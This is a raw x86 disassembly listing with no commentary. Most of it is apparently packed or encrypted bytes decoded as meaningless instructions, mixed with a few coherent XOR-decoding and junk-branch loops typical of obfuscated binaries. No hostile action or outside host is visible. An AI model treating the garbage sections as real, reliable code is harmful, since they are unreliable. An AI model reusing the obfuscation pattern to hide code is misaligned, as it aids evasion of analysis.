  4028ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402900:	stc    
  402901:	pop    esi
  402902:	adc    eax,0xeb926fd9
  402907:	mov    al,ds:0xbb92badb
  40290c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40290d:	fsubr  DWORD PTR [ebp-0x4d]
  402910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402911:	imul   esi,DWORD PTR [ebx+0x9],0xeeec1fbe
  402918:	sbb    cl,al
  40291a:	inc    esp
  40291b:	sti    
  40291c:	ss ss cmp al,0x79
  402920:	lock sub esi,DWORD PTR ds:0xf0c02469
  402927:	cmc    
  402928:	in     al,0x15
  40292a:	push   esi
  40292b:	je     0x402979
  40292d:	or     eax,0xc79f7d6d
  402932:	jle    0x402904
  402934:	fisubr DWORD PTR [ebx+eiz*4]
  402937:	push   ecx
  402938:	int3   
  402939:	int3   
  40293a:	(bad)  
  40293b:	rcl    BYTE PTR [ebp+0x22],1
  40293e:	(bad)  
  40293f:	xor    ebp,DWORD PTR [esi-0x13]
  402942:	hlt    
  402943:	cmc    
  402944:	sub    al,0xb7
  402946:	pushw  ss
  402948:	aad    0x49
  40294a:	stc    
  40294b:	ja     0x402975
  40294d:	call   0xcf59f235
  402952:	jge    0x40295a
  402954:	mov    ds:0xbb2f38f0,al
  402959:	pop    eax
  40295a:	push   edx
  40295b:	rcl    BYTE PTR [edx],0xed
  40295e:	rcr    DWORD PTR [esi],1
  402960:	lahf   
  402961:	push   cs
  402962:	xadd   DWORD PTR [ecx-0x49006b5b],edx
  402969:	mov    DWORD PTR [edi+0x73],ecx
  40296c:	mov    ebx,0x629c0bc7
  402971:	mov    cl,0x10
  402973:	aam    0x61
  402975:	fld    DWORD PTR [ebx]
  402977:	fdivr  QWORD PTR [eax-0x11bad389]
  40297d:	int3   
  40297e:	xchg   ebx,eax
  40297f:	popa   
  402980:	fst    DWORD PTR [eax+0x14]
  402983:	add    cl,BYTE PTR [ebx-0x35]
  402986:	lods   al,BYTE PTR ds:[esi]
  402987:	adc    eax,0x2096b7b1
  40298c:	adc    eax,0xd00200da
  402991:	loop   0x4029e5
  402993:	sbb    eax,DWORD PTR [ebx+0x751030d3]
  402999:	add    DWORD PTR [esi+0x69],0x51
  40299d:	or     DWORD PTR [esp+ebx*8-0x8],ebx
  4029a1:	mov    al,0x7a
  4029a3:	and    DWORD PTR [eax-0x3b],esp
  4029a6:	mov    dh,bl
  4029a8:	test   DWORD PTR ds:0x76135ff9,0x772558d3
  4029b2:	mov    bh,0x84
  4029b4:	in     al,dx
  4029b5:	adc    esp,0x55
  4029b8:	dec    ecx
  4029b9:	dec    edx
  4029ba:	das    
  4029bb:	cld    
  4029bc:	xchg   edx,eax
  4029bd:	pop    es
  4029be:	pop    ss
  4029bf:	in     eax,dx
  4029c0:	cmp    esp,DWORD PTR [edi-0x31]
  4029c3:	not    BYTE PTR [eax-0x46cde57e]
  4029c9:	lahf   
  4029ca:	(bad)  
  4029cb:	jge    0x4029eb
  4029cd:	ror    DWORD PTR [ecx-0x5c],0x53
  4029d1:	ror    cl,1
  4029d3:	shl    DWORD PTR [ecx-0x2f9a213c],cl
  4029d9:	mov    ds:0xcf33189,eax
  4029de:	mov    DWORD PTR cs:[esi-0x2c],esp
  4029e2:	push   0xffec2571
  4029e7:	push   0xffffffea
  4029e9:	enter  0x1a18,0xb6
  4029ed:	ss cs dec edi
  4029f0:	push   cs
  4029f1:	daa    
  4029f2:	scas   al,BYTE PTR es:[edi]
  4029f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029f4:	pop    ss
  4029f5:	adc    BYTE PTR [edi],0x29
  4029f8:	cdq    
  4029f9:	das    
  4029fa:	or     bh,BYTE PTR [eax-0x12]
  4029fd:	ss push edx
  4029ff:	and    al,BYTE PTR [edi+eax*1]
  402a02:	jo     0x402a83
  402a04:	cmp    eax,0x5fd69d8a
  402a09:	jbe    0x402a44
  402a0b:	je     0x402a50
  402a0d:	add    BYTE PTR [ebx],0x7d
  402a10:	adc    BYTE PTR [ebx],dh
  402a12:	rol    DWORD PTR [ebx],1
  402a14:	(bad)  
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x9699b980,al
  402a42:	mov    eax,0x7e7e0c68
  402a47:	push   ebp
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402a0a
  402a4c:	arpl   sp,bp
  402a4e:	out    0xf,eax
  402a50:	sar    BYTE PTR [edx+eax*8],cl
  402a53:	or     ebp,DWORD PTR [ecx-0x92c4792]
  402a59:	adc    eax,0x1bc4bdb9
  402a5e:	xor    DWORD PTR [edi+0x6bdfc90d],edx
  402a64:	in     eax,dx
  402a65:	push   edx
  402a66:	pop    eax
  402a67:	or     eax,0xf56672b1
  402a6c:	lods   eax,DWORD PTR ds:[esi]
  402a6d:	push   esi
  402a6e:	push   edx
  402a6f:	(bad)  
  402a70:	lahf   
  402a71:	sahf   
  402a72:	add    eax,0xc3fea76b
  402a77:	adc    DWORD PTR [eax+ecx*8-0x17],eax
  402a7b:	pop    eax
  402a7c:	fiadd  DWORD PTR [ecx-0x504f3777]
  402a82:	sbb    bh,BYTE PTR [ebp+0x62]
  402a85:	or     al,BYTE PTR [ebp+0x70]
  402a88:	xchg   ebp,eax
  402a89:	sahf   
  402a8a:	jns    0x9750649f
  402a90:	mov    BYTE PTR [edx-0x71],al
  402a93:	mov    ecx,es
  402a95:	xchg   ebx,eax
  402a96:	add    edi,DWORD PTR [esi-0x20]
  402a99:	mov    ecx,0x74be5899
  402a9e:	add    edi,ebp
  402aa0:	inc    esi
  402aa1:	imul   ebx,edi,0xffffffd3
  402aa4:	pop    esp
  402aa5:	push   es
  402aa6:	das    
  402aa7:	retf   
  402aa8:	retf   
  402aa9:	jno    0x402ac4
  402aab:	popa   
  402aac:	add    eax,0x92ac3b63
  402ab1:	das    
  402ab2:	(bad)  
  402ab4:	adc    DWORD PTR [esi+ebp*8+0x40137910],ecx
  402abb:	add    ebp,DWORD PTR [ebx+edx*2]
  402abe:	lods   al,BYTE PTR ds:[esi]
  402abf:	jo     0x402b0a
  402ac1:	sbb    ecx,ebx
  402ac3:	aam    0x3
  402ac5:	pop    ds
  402ac6:	cmp    BYTE PTR [edi+ecx*1],al
  402ac9:	cmp    al,0xd
  402acb:	mov    dl,BYTE PTR [ebx+0x2eda7e13]
  402ad1:	pop    ebx
  402ad2:	sbb    DWORD PTR [eax],eax
  402ad4:	daa    
  402ad5:	fld    QWORD PTR ds:0x9ab94bf0
  402adb:	retf   
  402adc:	inc    ebx
  402add:	or     eax,0x1b1fceef
  402ae2:	(bad)  
  402ae3:	mov    DWORD PTR [esi],ebp
  402ae5:	push   ebx
  402ae6:	(bad)  
  402ae8:	hlt    
  402ae9:	pop    edx
  402aea:	xchg   esi,eax
  402aeb:	mov    ss,WORD PTR [esi+0x45]
  402aee:	out    dx,eax
  402aef:	mov    bh,0xb3
  402af1:	jo     0x402ad6
  402af3:	pop    esp
  402af4:	lea    ebx,[ecx]
  402af6:	dec    edx
  402af7:	inc    edi
  402af8:	push   0xcfee01c6
  402afd:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402aff:	mov    ebp,0x22303d6e
  402b04:	fsubr  DWORD PTR [esi+0x6a]
  402b07:	mov    esp,0x4d3abd45
  402b0c:	push   esp
  402b0d:	fs stos BYTE PTR es:[edi],al
  402b0f:	ins    BYTE PTR es:[edi],dx
  402b10:	dec    esi
  402b11:	icebp  
  402b12:	mov    esp,0x5cc51a56
  402b17:	sbb    al,0xb2
  402b19:	mov    dh,0x47
  402b1b:	shl    BYTE PTR [esi+0x42],1
  402b1e:	pop    eax
  402b1f:	pop    edx
  402b20:	test   BYTE PTR [edi],dl
  402b22:	jns    0x402ab0
  402b24:	cdq    
  402b25:	sub    esi,esi
  402b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b28:	pop    esp
  402b29:	imul   ebp,DWORD PTR [eax+0x23],0xc5c0bebd
  402b30:	adc    cl,BYTE PTR [ebp-0x595854ae]
  402b36:	lods   eax,DWORD PTR ds:[esi]
  402b37:	inc    eax
  402b38:	outs   dx,BYTE PTR ds:[esi]
  402b39:	mov    al,ds:0x4c1c942a
  402b3e:	ja     0x402ba3
  402b40:	std    
  402b41:	es pusha 
  402b43:	mov    BYTE PTR [ecx-0x51],cl
  402b46:	scas   eax,DWORD PTR es:[edi]
  402b47:	pop    ecx
  402b48:	(bad)  
  402b49:	jge    0x402b57
  402b4b:	inc    eax
  402b4c:	push   0x8f4c9170
  402b51:	adc    esi,DWORD PTR [esi+0x2]
  402b54:	push   ebx
  402b55:	mov    ds:0xa90e9b89,al
  402b5a:	inc    esi
  402b5b:	mov    BYTE PTR [ebp+0x25afd68],bh
  402b61:	outs   dx,BYTE PTR ds:[esi]
  402b62:	xchg   edi,eax
  402b63:	aaa    
  402b64:	mov    al,0x27
  402b66:	pop    edx
  402b67:	icebp  
  402b68:	xlat   BYTE PTR ds:[ebx]
  402b69:	int    0xc
  402b6b:	sub    dl,BYTE PTR [edi+0x57]
  402b6e:	ins    BYTE PTR es:[edi],dx
  402b6f:	repz and bl,BYTE PTR [eax+ebp*8-0x65a706fa]
  402b77:	xchg   ebp,eax
  402b78:	(bad)  
  402b79:	jl     0x402b17
  402b7b:	mov    ?,WORD PTR [ebx+0x2ec804f2]
  402b81:	scas   al,BYTE PTR es:[edi]
  402b82:	call   0xc72e538d
  402b87:	xchg   ebx,eax
  402b88:	adc    DWORD PTR [eax-0x59eefd10],0x67738679
  402b92:	lea    edi,[ebp-0x6c]
  402b95:	jle    0x402bf1
  402b97:	jge    0x402bda
  402b99:	pop    esp
  402b9a:	call   0xb7e8:0xaa218e72
  402ba1:	popf   
  402ba2:	rcr    BYTE PTR [esi-0x363a2f20],0x7a
  402ba9:	mov    edx,0x32ccd723
  402bae:	adc    eax,0xad4ae87e
  402bb3:	cli    
  402bb4:	repnz sbb esp,DWORD PTR [edx-0x57]
  402bb8:	ins    BYTE PTR es:[edi],dx
  402bb9:	jp     0x402b90
  402bbb:	add    al,0x52
  402bbd:	add    al,0x68
  402bbf:	nop
  402bc0:	ror    BYTE PTR [ebx],1
  402bc2:	cwde   
  402bc3:	cmp    ebx,DWORD PTR [ebx-0x701762dd]
  402bc9:	cbw    
  402bcb:	fxch   st(6)
  402bcd:	aaa    
  402bce:	cmp    ebx,DWORD PTR [edx+0x21]
  402bd1:	ret    0x1a92
  402bd4:	add    ebp,ebp
  402bd6:	data16 jg 0x402be6
  402bd9:	dec    eax
  402bda:	jg     0x402b88
  402bdc:	add    al,0x1
  402bdf:	adc    ah,dh
  402be1:	sub    esp,DWORD PTR [esi]
  402be3:	sub    al,0x89
  402be5:	sub    eax,0x2d49293f
  402bea:	pushf  
  402beb:	sbb    al,0xbf
  402bed:	fs sub al,0x92
  402bf0:	push   cs
  402bf1:	loopne 0x402bdb
  402bf3:	add    al,0xc
  402bf5:	(bad)  
  402bf6:	push   0xffffff96
  402bf8:	mov    edx,ebp
  402bfa:	enter  0xfdd1,0x7c
  402bfe:	inc    edi
  402bff:	(bad)  
  402c00:	cmp    ebp,ecx
  402c02:	cmp    ecx,DWORD PTR [eax-0x3e6f7c8d]
  402c08:	push   edi
  402c09:	xchg   DWORD PTR [edi+0x5a216a75],edi
  402c0f:	fld    DWORD PTR ds:0x2ea287ca
  402c15:	cmp    esp,esp
  402c17:	cli    
  402c18:	sub    eax,0xc9095e72
  402c1d:	rcl    BYTE PTR [edx-0x3db1c2dd],0xb9
  402c24:	mov    cs,ebp
  402c26:	xor    edi,ecx
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0xb0
  402c6b:	mov    al,BYTE PTR [edx+0x7e0a4f7b]
  402c71:	jle    0x402cc8
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c6d
  402c77:	jmp    0x402c8f
  402c79:	in     al,dx
  402c7a:	daa    
  402c7b:	mov    cl,0x57
  402c7d:	lock out dx,al
  402c7f:	retf   0x36a5
  402c82:	icebp  
  402c83:	pusha  
  402c84:	push   ecx
  402c85:	test   DWORD PTR [esi+0x26cdda66],eax
  402c8b:	imul   ebx,edi,0xe0a6f3b
  402c91:	fisubr WORD PTR [eax+0x7c6b888a]
  402c97:	cmp    DWORD PTR [ebp+0x335cc6bf],esp
  402c9d:	xchg   edx,eax
  402c9e:	jnp    0x402cf7
  402ca0:	test   eax,0x7c2ccb39
  402ca5:	imul   ebp,eax,0x52a1da34
  402cab:	sub    BYTE PTR ds:0x7dbf622a,bl
  402cb1:	mov    esi,DWORD PTR [ebp*2-0x2e83e456]
  402cb8:	push   0xcea26e10
  402cbd:	sar    DWORD PTR [ebp-0x3c],1
  402cc0:	xchg   edi,eax
  402cc1:	(bad)  
  402cc2:	add    bh,BYTE PTR [esi+esi*2+0x73]
  402cc6:	or     eax,DWORD PTR [edx-0x7fc19cdf]
  402ccc:	stos   BYTE PTR es:[edi],al
  402ccd:	cli    
  402cce:	and    DWORD PTR [edx+0x4e455c5f],esp
  402cd4:	sti    
  402cd5:	aaa    
  402cd6:	push   ebp
  402cd7:	test   al,0x5f
  402cd9:	stc    
  402cda:	ja     0x402cf4
  402cdc:	lds    esp,FWORD PTR [ebx]
  402cde:	jl     0x402d09
  402ce0:	and    al,0x2e
  402ce2:	xor    BYTE PTR ds:0xdc70f6b5,0xf0
  402ce9:	test   BYTE PTR [ecx+0x2a328450],al
  402cef:	mov    ch,0x48
  402cf1:	sub    BYTE PTR [eax-0xf],dh
  402cf4:	mov    cl,0x57
  402cf6:	and    dh,cl
  402cf8:	sbb    al,0x50
  402cfa:	lock xor ah,bl
  402cfd:	ficom  DWORD PTR [ecx+0x6cecba12]
  402d03:	scas   eax,DWORD PTR es:[edi]
  402d04:	push   ds
  402d05:	cmc    
  402d06:	sbb    al,0xf0
  402d08:	std    
  402d09:	mov    ebp,0xeb5b58af
  402d0e:	or     al,BYTE PTR [ebx*2-0xaebcdb1]
  402d15:	enter  0xeb82,0xf4
  402d19:	cmp    eax,0x5d2ac3d7
  402d1e:	xor    al,0xb2
  402d20:	pop    edx
  402d21:	in     eax,0x70
  402d23:	fwait
  402d24:	push   cs
  402d25:	popf   
  402d26:	mov    eax,ds:0xf4d0b48c
  402d2b:	imul   esp,DWORD PTR [edi],0xffffffac
  402d2e:	shld   DWORD PTR [ecx-0x6d048915],edi,0xa0
  402d36:	jg     0x402d81
  402d38:	inc    esp
  402d39:	mov    ebp,0x9cc88d49
  402d3e:	ja     0x402d2c
  402d40:	dec    edi
  402d41:	mov    bl,0x29
  402d43:	in     al,0xa6
  402d45:	pop    eax
  402d46:	hlt    
  402d47:	inc    ebx
  402d48:	add    esi,DWORD PTR [edi-0x5afa0499]
  402d4e:	leave  
  402d4f:	fild   WORD PTR [eax+0x3d]
  402d52:	cmp    ch,al
  402d54:	(bad)  
  402d55:	into   
  402d56:	mov    ds:0xfcb5a7ae,eax
  402d5b:	inc    esi
  402d5c:	mov    ch,0xcf
  402d5e:	and    BYTE PTR [edx],al
  402d60:	mov    ebx,0x3a59e2e9
  402d65:	sub    eax,edi
  402d67:	xchg   edx,eax
  402d68:	(bad)  
  402d69:	or     al,0x2
  402d6b:	pop    ecx
  402d6c:	mov    ah,0xa7
  402d6e:	test   BYTE PTR [ebp+eiz*2+0x5],bh
  402d72:	(bad)  
  402d73:	in     al,dx
  402d74:	push   ss
  402d75:	int    0x10
  402d77:	inc    edx
  402d78:	das    
  402d79:	mov    ch,0xf1
  402d7b:	jns    0x402d14
  402d7d:	std    
  402d7e:	inc    esp
  402d7f:	std    
  402d80:	ins    BYTE PTR es:[edi],dx
  402d81:	push   edx
  402d82:	add    BYTE PTR [ebx+0x32],bl
  402d85:	sub    eax,0x4a7db86c
  402d8a:	add    esi,DWORD PTR [ebx+ebp*1]
  402d8d:	cwde   
  402d8e:	push   ebx
  402d8f:	outs   dx,DWORD PTR ds:[esi]
  402d90:	test   BYTE PTR [ecx-0x3ed9f5ac],ch
  402d96:	icebp  
  402d97:	(bad)  
  402d98:	shl    esp,cl
  402d9a:	lock cmp eax,0x9f05522d
  402da0:	add    dl,BYTE PTR [esp+ebp*2]
  402da3:	cmp    DWORD PTR [edx],0xffffff8c
  402da6:	ficom  WORD PTR [eax]
  402da8:	mov    ebx,0xbf9b944d
  402dad:	jno    0x402e0a
  402daf:	and    DWORD PTR [esi],edi
  402db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402db2:	mov    ah,0x69
  402db4:	mov    esp,0xc5275357
  402db9:	add    al,0x42
  402dbb:	mov    dl,0x44
  402dbd:	ret    0x7c9c
  402dc0:	adc    edi,DWORD PTR ds:0x167378cd
  402dc6:	or     eax,0x66df507a
  402dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dcc:	(bad)  
  402dcd:	leave  
  402dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dcf:	out    dx,eax
  402dd0:	add    al,0x40
  402dd2:	push   edx
  402dd3:	scas   al,BYTE PTR es:[edi]
  402dd4:	jle    0x402da7
  402dd6:	lds    ecx,FWORD PTR [edi+eax*1-0x5ed875c9]
  402ddd:	out    0xbc,al
  402ddf:	call   0x2c71:0x5c7f062
  402de6:	pop    esp
  402de7:	mov    esi,0xad6b24d6
  402dec:	or     BYTE PTR [ecx],al
  402dee:	in     al,dx
  402def:	sub    ch,BYTE PTR [edx+0x18]
  402df2:	pop    ebx
  402df3:	sbb    esi,eax
  402df5:	jae    0x402e22
  402df7:	sahf   
  402df8:	mov    edx,0xea491a34
  402dfd:	sbb    BYTE PTR [esi],0x1
  402e00:	gs leave 
  402e02:	push   esi
  402e03:	pop    edi
  402e04:	leave  
  402e05:	add    cl,ah
  402e07:	iret   
  402e08:	dec    edx
  402e09:	and    DWORD PTR [eax-0x6a9c6231],esp
  402e0f:	imul   esi,DWORD PTR [ecx+ebp*1-0x517e97e4],0x56a95d15
  402e1a:	(bad)  
  402e1b:	(bad)  
  402e1d:	test   DWORD PTR [edx+edx*2-0xdc5ce0],edx
  402e24:	inc    edx
  402e25:	das    
  402e26:	cmp    DWORD PTR [eax-0x26],ebp
  402e29:	mov    ebx,0x9783fa08
  402e2e:	mov    al,0xc5
  402e30:	mov    DWORD PTR ds:0x632aaec0,ecx
  402e36:	pop    edx
  402e37:	pop    ebp
  402e38:	xor    eax,0x16acd515
  402e3d:	xor    DWORD PTR [eax-0x3fa67ae9],edx
  402e43:	arpl   ax,dx
  402e45:	sub    BYTE PTR [ecx+0x273f6cd8],dh
  402e4b:	out    dx,eax
  402e4c:	xchg   esp,edx
  402e4e:	ja     0x402e28
  402e50:	mov    cl,0x3
  402e52:	jne    0x402e64
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e750,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x4303b5
  402e91:	xor    ecx,DWORD PTR ds:0x42ed53
  402e97:	mov    DWORD PTR ds:0x4303b5,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ed6f,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ed6f
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ed6f,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ed6f,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ed6f,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42ea1b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ed67,0x17
  402efd:	cmp    DWORD PTR ds:0x42ed67,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ed67,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x4303c9
  402f21:	push   0x42e837
  402f26:	call   DWORD PTR ds:0x42e933
  402f2c:	cmp    DWORD PTR ds:0x42ed67,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ed67
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ed67,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ed67
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ed67,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42ed4f,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42ed4f
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42ed4f,ecx
  402f71:	cmp    DWORD PTR ds:0x42ed4f,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x4303ed
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e947
  402f8f:	cmp    DWORD PTR ds:0x42ed4f,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42ed4b,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x4303d5,0x10
  402faf:	cmp    DWORD PTR ds:0x4303d5,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x4303d5,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e7ad
  402fd4:	call   DWORD PTR ds:0x42e94b
  402fda:	cmp    DWORD PTR ds:0x4303d5,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x4303d5
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x4303d5,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x4303d5
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x4303d5,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x4303ed,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e740
  403019:	add    DWORD PTR ds:0x42ed73,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x43045b,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e748,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	les    ebx,FWORD PTR [ebx+ecx*4]
  403052:	push   edx
  403053:	mov    ds:0xae7e7e08,al
  403058:	jg     0x4030d8
  40305a:	jle    0x403085
  40305c:	xchg   esp,eax
  40305d:	mov    edi,0x862e0733
  403062:	sti    
  403063:	(bad)  
  403064:	cmc    
  403065:	sub    DWORD PTR [eax-0x2ed33e93],edi
  40306b:	cld    
  40306c:	ret    0x9fec
  40306f:	push   ss
  403070:	dec    ecx
  403071:	dec    edi
  403072:	adc    DWORD PTR [edx+0x6f],edi
  403075:	cmp    edx,edi
  403077:	cwde   
  403078:	mov    eax,ds:0x683177c3
  40307d:	pop    ecx
  40307e:	popf   
  40307f:	arpl   WORD PTR [esi],dx
  403081:	in     eax,dx
  403082:	fnstsw WORD PTR [esp+ebp*8]
  403085:	and    BYTE PTR [esi-0xe8ddd44],ch
  40308b:	mov    esp,esp
  40308d:	xchg   ecx,eax
  40308e:	pop    ss
  40308f:	js     0x403110
  403091:	dec    ebp
  403092:	fneni(8087 only) 
  403094:	jmp    0x961e:0x4b358253
  40309b:	jmp    0xfe6c9c70
  4030a0:	xchg   edx,eax
  4030a1:	gs add eax,0x64b8a316
  4030a7:	shl    DWORD PTR [eax],1
  4030a9:	jb     0x403048
  4030ab:	(bad)  
  4030ad:	cwde   
  4030ae:	mov    esp,0x119c20
  4030b3:	mov    ebp,0x8326c1df
  4030b8:	ret    
  4030b9:	fnstsw WORD PTR [ebx]
  4030bb:	faddp  st(7),st
  4030bd:	sub    cl,BYTE PTR [edi+0xc09bece]
  4030c3:	retf   
  4030c4:	and    dh,BYTE PTR [ecx+0x3e98f3ba]
  4030ca:	add    eax,0x16cee9b
  4030cf:	sbb    esp,DWORD PTR [edi+0x27]
  4030d2:	mov    al,ds:0x9328203a
  4030d7:	iret   
  4030d8:	rcr    bl,1
  4030da:	adc    DWORD PTR [edi-0x4fedea7f],esi
  4030e0:	in     eax,dx
  4030e1:	fsubr  st,st(0)
  4030e3:	add    al,0x69
  4030e5:	mov    al,bh
  4030e7:	loopne 0x4030ee
  4030e9:	aas    
  4030ea:	pop    es
  4030eb:	jecxz  0x4030ab
  4030ed:	fs adc eax,0x76bf03bd
  4030f3:	fisubr WORD PTR [eax]
  4030f5:	shl    BYTE PTR [edi],cl
  4030f7:	pushf  
  4030f8:	mov    bh,0x4f
  4030fa:	(bad)  
  4030fc:	loop   0x4030a1
  4030fe:	push   esi
  4030ff:	in     al,dx
  403100:	xor    ebx,DWORD PTR ds:0xa3ef7e92
  403106:	in     eax,dx
  403107:	lods   eax,DWORD PTR ds:[esi]
  403108:	push   es
  403109:	add    al,ch
  40310b:	pop    edx
  40310c:	pop    edi
  40310d:	stc    
  40310e:	mov    cl,0xa7
  403110:	jge    0x4030e3
  403112:	push   edx
  403113:	mov    edi,ebp
  403115:	neg    DWORD PTR [eax]
  403117:	loopne 0x4030ec
  403119:	hlt    
  40311a:	shr    BYTE PTR [ebp+0x3d3166fd],0x39
  403121:	cli    
  403122:	and    eax,ebx
  403124:	adc    al,bh
  403126:	push   ebp
  403127:	add    ecx,DWORD PTR [ecx-0x34991e9d]
  40312d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40312e:	frstor [eax+esi*8+0x1d]
  403132:	cld    
  403133:	push   ss
  403134:	addr16 gs pop ebp
  403137:	xor    BYTE PTR [edx-0x633c114c],cl
  40313d:	test   al,0xdc
  40313f:	cli    
  403140:	and    esp,DWORD PTR [eax+0x67a14421]
  403146:	scas   eax,DWORD PTR es:[edi]
  403147:	add    BYTE PTR [edi+0x5c],0x87
  40314b:	dec    ebp
  40314c:	adc    al,0xb9
  40314e:	lods   al,BYTE PTR ds:[esi]
  40314f:	popa   
  403150:	enter  0x5d8c,0x18
  403154:	loopne 0x4030fd
  403156:	in     eax,dx
  403157:	(bad)  
  403158:	int3   
  403159:	adc    BYTE PTR [ebx+0x561b4e2d],dl
  40315f:	popa   
  403160:	test   al,0x68
  403162:	cmp    eax,0x9ffeda7c
  403167:	mov    ah,0x89
  403169:	mov    dl,0xb8
  40316b:	ror    BYTE PTR [ebp+0x7c],0x33
  40316f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403170:	jl     0x4031ad
  403172:	aas    
  403173:	(bad)
  403176:	jp     0x40311c
  403178:	jmp    0x1961e500
  40317d:	mov    DWORD PTR [esi-0x7b98ff24],ebx
  403183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403184:	pop    es
  403185:	inc    ebx
  403186:	clc    
  403187:	imul   edi,ebx,0x65ffdac5
  40318d:	jb     0x40319a
  40318f:	je     0x4031a6
  403191:	sbb    DWORD PTR [edi+0x6c],edi
  403194:	push   ds
  403195:	icebp  
  403196:	mov    edi,0x80df8eec
  40319b:	and    eax,0x6e
  40319e:	sbb    BYTE PTR [eax],dl
  4031a0:	stos   BYTE PTR es:[edi],al
  4031a1:	pop    edi
  4031a2:	dec    ecx
